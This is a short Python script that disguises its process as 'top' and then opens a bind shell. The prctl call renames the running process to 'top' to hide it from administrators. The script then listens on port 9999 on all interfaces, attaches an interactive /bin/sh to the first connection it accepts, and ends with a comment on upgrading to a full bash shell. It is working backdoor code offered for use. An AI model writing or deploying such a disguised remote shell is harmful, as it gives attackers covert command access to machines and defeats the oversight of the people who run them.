def set_procname(newname):
    from ctypes import cdll, byref, create_string_buffer
    libc = cdll.LoadLibrary('libc.so.6')    #Loading a 3rd party library C
    buff = create_string_buffer(len(newname)+1) #Note: One larger than the name (man prctl says that)
    buff.value = newname                 #Null terminated string as it should be
    libc.prctl(15, byref(buff), 0, 0, 0) #Refer to "#define" of "/usr/include/linux/prctl.h" for the misterious value 16 & arg[3..5] are zero as the man page says.


set_procname("top")
import socket, subprocess, os;
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 9999))
s.listen(1)
conn, addr = s.accept()
os.dup2(conn.fileno(), 0);
os.dup2(conn.fileno(), 1);
os.dup2(conn.fileno(), 2);
p = subprocess.call(["/bin/sh", "-i"]);
conn.close()
exit(0)
# run python -c 'import pty; pty.spawn("/bin/bash")' on the host for a better shell
